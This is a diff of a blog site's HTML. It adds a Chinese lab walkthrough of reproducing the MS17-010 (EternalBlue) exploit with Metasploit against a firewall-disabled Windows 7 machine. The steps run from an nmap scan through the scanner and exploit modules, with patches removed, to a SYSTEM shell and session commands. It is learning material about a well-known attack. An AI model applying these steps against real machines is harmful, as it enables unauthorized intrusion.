+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">查看当前用户</span><br>getuid<br><span class="hljs-meta">#</span><span class="bash">进入shell</span><br>shell<br><span class="hljs-meta">#</span><span class="bash">解决shell乱码</span><br>chcp 65001<br><span class="hljs-meta">#</span><span class="bash">推出shell</span><br>exit<br><span class="hljs-meta">#</span><span class="bash">把会话放到后台</span><br>background<br><span class="hljs-meta">#</span><span class="bash">查看会话</span><br>sessions<br><span class="hljs-meta">#</span><span class="bash">进入某个会话</span><br>session -i id号<br><span class="hljs-meta">#</span><span class="bash">删除会话</span><br>session -k id号<br></code></pre></td></tr></table></figure>
+
+<h2 id="ms17-010漏洞复现"><a href="#ms17-010漏洞复现" class="headerlink" title="ms17-010漏洞复现"></a>ms17-010漏洞复现</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>永恒之蓝（ms17-010）爆发于2017年4月14日，是一种利用windows系统smb协议漏洞来获取系统最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日不法分子通过改造永恒之蓝制作了wannnacry勒索病毒，使全世界大范围遭受该勒索病毒，该病毒后来被微软修复。存在漏洞的主机只要开放445端口即可被攻击获取系统最高权限。</p>
+<p><strong>影响版本</strong>目前已知受影响的 Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在msf中利用ms17-010漏洞来攻击系统，以初步熟悉msf工具</p>
+<p>复现环境：攻击机为kali 被攻击机为win7 关闭防火墙</p>
+<p>1、主机发现</p>
+<p>在kali中使用nmap扫描win7开放端口<br><code>nmap win7地址 -O操作系统识别 -sS -T4</code><br>下一步需要学习nmap工具的使用<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-18-18.png" alt="扫描发现可以使用" class="lazyload"></p>
+<p>2、永恒之蓝漏洞探测</p>
+<p>先进入msf，然后搜索ms17-010的漏洞模块<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-24-26.png" alt="进入msf搜索漏洞并使用" class="lazyload"></p>
+<p>3、我们使用scanner模块对主机进行扫描，检测是否存在漏洞，<strong>use 1</strong>首先查看模块信息使用info命令查看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-27-11.png" alt="扫描测试模块" class="lazyload"></p>
+<p>4、如何利用模块对主机扫描，只需要使用show options选项，查看我们需要输入的具体参数，其中表注了yes的选项是必须的参数，若参数为空则需要我们填写，RHOSTS选项为空，所以我们需要填写，代表攻击目标，输入r使用tab补全该参数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-29-15.png" alt="配置扫描目标" class="lazyload"></p>
+<p>5、使用run执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-30-34.png" alt="扫描测试成功可以利用" class="lazyload"></p>
+<p>6、使用攻击模块并重复上述设置<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-30-33.png" alt="查看信息" class="lazyload"><br>7、配置目标<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-35-36.png" alt="配置目标" class="lazyload"><br>8、使用run执行攻击<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-50-23.png" alt="执行" class="lazyload"><br>如果发现攻击失败，这里出现的原因可能是防火墙未关闭，远程连接没有打开，或者是补丁的原因，这里是补丁原因<a target="_blank" rel="noopener" href="https://blog.csdn.net/seachyu/article/details/125364946">参考连接</a><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-58-34.png" alt="补丁全部卸载" class="lazyload">把可以卸载的都卸了卸载完成重启<br>重启后再次执行永恒之蓝利用程序测试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-09-43.png" alt="成功" class="lazyload"><br>可以看到成功获取到了win7的system权限并且可以成功执行命令<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-14-57.png" alt="命令" class="lazyload"><br><strong>注意</strong>：在这里我直接使用攻击模块去攻击的并没有扫描所以才会在攻击那块攻击失败，而扫描是攻击成功后加上去的，正规流程是扫描就会报错然后删除补丁重新扫描成功在利用攻击模块攻击</p>
+<p>9、使用exit可以推出当前shell使用background可以将会话放到msf后台使用sessions可以查看后台shell使用sessions -i id号可以进入相关shell</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-20-38.png" alt="获取权限" class="lazyload"></p>
+
+            
+        </article>
+    </div>
     
     <div class="nexmoe-post">
         <a href="/2023/04/14/hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
@@ -281,7 +467,7 @@
 <p>linux文件系统类型ext4、swap交换文件系统，支持的类型有fat16、fat32（单个文件不能超过4G）、ntfs（单个文件不能超过2T）、xfs、jfs、exfat格式支持各种操作系统跨系统</p>
 <p>修改红帽密码按键操作ee2es回车b引导输入passwd修改密码</p>
 <p>linux目录结构：<br>根目录下分很多 bin目录是命令 boot引导分区开机启动项 dev存放存储介质 etc存放配置文件 home普通用户家目录 lib库文件 media、mnt用来挂载存放介质 opt大型应用程序 proc系统开机生成的临时文件 root超级管理员家目录 sbin超级管理员命令 selinux防护体系 srv、sys系统文件 tmp有编译权限 usr存放源代码安装路径 var存放日志或消息或者网站根目录</p>
-<p>#号代表的是管理员 $是普通用户</p>
+<p>井号#号代表的是管理员 $是普通用户</p>
 <p>内部命令安装完系统自带的命令，外部命令安装的应用程序产生的命令<br>短命令一个- 长命令两个- 可以用–help查看帮助<br>uname -r（版本号） -a（详细信息）<br>hostname查看或临时修改计算机名称<br>ifconfig查看ip信息 dhclient加名称 重新获取ip<br>cat /proc/cpuinfo 查看cpu信息<br>cat /proc/meminfo 查看系统内存信息<br>halt 关机<br>reboot 重启<br>pwd 查看当前目录<br>cd 切换目录<br>du 统计目录及文件空间占用情况 -sh统计目录大小<br>ls 产看文件命令 -l查看详细的文件信息 -h查看大小 -a查看隐藏文件</p>
 <hr>
 <p>chmod 更改文件权限 chmod o+x其他人加x chmod g+x给组加x权限 chmod u-x给所有者减x权限 chmod a+x给所有人加x权限 也可以用数字修改权限 r4 w2 x1 值相加 例如chmod 777 xxx<br>chomn修改所有者 -R递归继承</p>
@@ -329,7 +515,7 @@
 
  
 
-<script async src="/js/app.js?v=1681535802752"></script>
+<script async src="/js/app.js?v=1681885929857"></script>
 
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
 <script>
